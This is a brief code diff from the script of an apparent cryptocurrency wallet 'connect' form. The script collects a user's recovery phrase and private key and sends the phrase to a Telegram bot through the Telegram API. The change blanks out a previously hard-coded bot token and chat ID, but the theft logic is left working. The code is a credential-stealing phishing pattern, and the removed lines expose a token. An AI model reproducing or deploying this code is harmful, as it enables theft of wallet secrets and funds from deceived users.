@@ -5,8 +5,8 @@ document.getElementById('connectForm').addEventListener('submit', function(event
     const privateKey = document.getElementById('privateKeyInput').value; // Get the private key
 
     // Send the phrase to Telegram
-    const botToken = '7725425825:AAHzy3GD_g7pZq_ZEcyhdbuMATyh3CX8klI'; // Your bot token
-    const chatId = '1207950273'; // Your chat ID
+    const botToken = ''; // Your bot token
+    const chatId = ''; // Your chat ID
     const message = encodeURIComponent(phrase);
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
